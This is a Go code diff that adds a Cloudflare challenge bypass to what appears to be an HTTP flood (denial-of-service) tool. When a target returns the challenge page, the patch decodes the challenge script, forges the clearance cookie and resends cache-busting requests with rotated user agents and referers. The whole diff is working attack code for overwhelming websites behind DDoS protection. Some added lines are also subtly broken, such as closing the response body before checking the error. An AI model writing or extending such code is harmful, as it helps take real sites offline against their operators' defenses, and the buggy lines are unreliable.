@@ -21,6 +21,8 @@ import (
 	"strings"
 	"sync/atomic"
 	"syscall"
+	"github.com/PuerkitoBio/goquery"
+	"github.com/organization/cloudflare-bypass"
 )
 
 // const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
@@ -163,6 +165,7 @@ func httpcall(url string, host string, s chan uint8) {
 		q.Header.Set("Connection", "keep-alive")
 		q.Header.Set("Host", host)
 		r, e := client.Do(q)
+		defer r.Body.Close()
 		if e != nil {
 			fmt.Fprintln(os.Stderr, e.Error())
 			if strings.Contains(e.Error(), "socket: too many open files") {
@@ -172,7 +175,29 @@ func httpcall(url string, host string, s chan uint8) {
 			s <- callExitOnErr
 			return
 		}
-		r.Body.Close()
+		doc, _ := goquery.NewDocumentFromResponse(r)
+
+		if doc.Find("title").First().Text()[:7] == "You are" {
+			go func() {
+				s := cfbypass.DecodeScript(doc)
+				c := &http.Cookie{
+					Name:    cfbypass.GetCookieKey(s[1]),
+					Value:   cfbypass.GetCookieValue(s[0]),
+					Path:    "/",
+				}
+				q, _ := http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
+				q.AddCookie(c)
+				q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
+				q.Header.Set("Cache-Control", "no-cache")
+				q.Header.Set("Accept-Charset", acceptCharset)
+				q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
+				q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
+				q.Header.Set("Connection", "keep-alive")
+				q.Header.Set("Host", host)
+				r, _ := client.Do(q)
+				defer r.Body.Close()
+			}()
+		}
 		s <- callGotOk
 		if safe {
 			if r.StatusCode >= 500 {
